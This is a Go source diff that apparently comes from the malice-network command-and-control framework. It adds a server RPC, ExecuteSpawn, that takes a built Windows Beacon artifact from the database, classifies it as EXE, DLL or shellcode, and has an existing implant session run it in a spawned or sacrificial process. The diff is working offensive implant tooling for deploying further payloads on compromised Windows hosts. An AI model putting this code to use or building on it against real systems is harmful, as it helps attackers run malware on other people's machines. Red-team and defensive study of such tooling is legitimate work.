@@ -14,8 +14,11 @@ import (
 
 	"github.com/chainreactors/logs"
 	"github.com/chainreactors/malice-network/helper/utils/output"
+	"github.com/chainreactors/malice-network/helper/utils/pe"
 	"github.com/chainreactors/malice-network/server/internal/core"
 	"github.com/chainreactors/malice-network/server/internal/db"
+	"google.golang.org/grpc/codes"
+	"google.golang.org/grpc/status"
 )
 
 //var (
@@ -246,6 +249,125 @@ func (rpc *Server) ExecuteDll(ctx context.Context, req *implantpb.ExecuteBinary)
 
 func (rpc *Server) ExecuteDLL(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
 	return rpc.ExecuteDll(ctx, req)
+}
+
+func (rpc *Server) ExecuteSpawn(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
+	if req == nil || strings.TrimSpace(req.GetName()) == "" {
+		return nil, status.Error(codes.InvalidArgument, "artifact name is required")
+	}
+
+	session, err := getSession(ctx)
+	if err != nil {
+		return nil, err
+	}
+	sessionPB := session.ToProtobufLite()
+	if sessionPB.GetOs() == nil || !strings.EqualFold(sessionPB.GetOs().GetName(), consts.Windows) {
+		return nil, status.Error(codes.FailedPrecondition, "spawn is only supported on Windows sessions")
+	}
+
+	artifactModel, err := db.GetArtifactByName(strings.TrimSpace(req.GetName()))
+	if err != nil {
+		return nil, status.Errorf(codes.NotFound, "artifact %q was not found", strings.TrimSpace(req.GetName()))
+	}
+	if !strings.EqualFold(artifactModel.Status, consts.BuildStatusCompleted) {
+		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q is not completed", artifactModel.Name)
+	}
+
+	artifact, err := artifactModel.ToArtifact()
+	if err != nil {
+		return nil, status.Errorf(codes.Internal, "read artifact %q: %v", artifactModel.Name, err)
+	}
+	if !strings.EqualFold(artifact.GetType(), consts.CommandBuildBeacon) {
+		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q is not a Beacon", artifact.GetName())
+	}
+	if !strings.EqualFold(artifact.GetPlatform(), consts.Windows) {
+		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q is not a Windows Artifact", artifact.GetName())
+	}
+
+	module, err := spawnArtifactModule(artifact)
+	if err != nil {
+		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q: %v", artifact.GetName(), err)
+	}
+	if !spawnSessionHasModule(sessionPB, module) {
+		return nil, status.Errorf(codes.FailedPrecondition, "session does not have required module %q", module)
+	}
+	arch, err := resolveSpawnArch(artifact, sessionPB)
+	if err != nil {
+		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q: %v", artifact.GetName(), err)
+	}
+
+	binary := &implantpb.ExecuteBinary{
+		Name:        artifact.GetName(),
+		Bin:         artifact.GetBin(),
+		Type:        module,
+		ProcessName: req.GetProcessName(),
+		Output:      req.GetOutput(),
+		Arch:        arch,
+		Timeout:     req.GetTimeout(),
+		Sacrifice:   req.GetSacrifice(),
+		Delay:       req.GetDelay(),
+	}
+
+	switch module {
+	case consts.ModuleExecuteExe:
+		return rpc.ExecuteEXE(ctx, binary)
+	case consts.ModuleExecuteDll:
+		return rpc.ExecuteDLL(ctx, binary)
+	case consts.ModuleExecuteShellcode:
+		return rpc.ExecuteShellcode(ctx, binary)
+	default:
+		return nil, status.Errorf(codes.Internal, "unsupported spawn module %q", module)
+	}
+}
+
+func spawnArtifactModule(artifact *clientpb.Artifact) (string, error) {
+	if artifact == nil || len(artifact.GetBin()) == 0 {
+		return "", fmt.Errorf("binary content is empty")
+	}
+
+	switch pe.CheckPEType(artifact.GetBin()) {
+	case consts.EXEFile:
+		return consts.ModuleExecuteExe, nil
+	case consts.DLLFile:
+		return consts.ModuleExecuteDll, nil
+	}
+
+	switch strings.ToLower(strings.TrimSpace(artifact.GetFormat())) {
+	case consts.ShellcodeFile, "bin", consts.FormatRaw, "shellcode", ".shellcode":
+		return consts.ModuleExecuteShellcode, nil
+	default:
+		return "", fmt.Errorf("unsupported binary format %q", artifact.GetFormat())
+	}
+}
+
+func spawnSessionHasModule(session *clientpb.Session, module string) bool {
+	if session == nil {
+		return false
+	}
+	for _, loaded := range session.GetModules() {
+		if strings.EqualFold(strings.TrimSpace(loaded), module) {
+			return true
+		}
+	}
+	return false
+}
+
+func resolveSpawnArch(artifact *clientpb.Artifact, session *clientpb.Session) (uint32, error) {
+	candidates := []string{artifact.GetArch()}
+	if target, ok := consts.GetBuildTarget(artifact.GetTarget()); ok {
+		candidates = append(candidates, target.Arch)
+	}
+	if session != nil && session.GetOs() != nil {
+		candidates = append(candidates, session.GetOs().GetArch())
+	}
+
+	for _, candidate := range candidates {
+		normalized := consts.FormatArch(strings.ToLower(strings.TrimSpace(candidate)))
+		if arch, ok := consts.ArchMap[normalized]; ok {
+			return uint32(arch), nil
+		}
+	}
+	return 0, fmt.Errorf("architecture is missing or unsupported")
 }
 
 func (rpc *Server) ExecutePowerpick(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
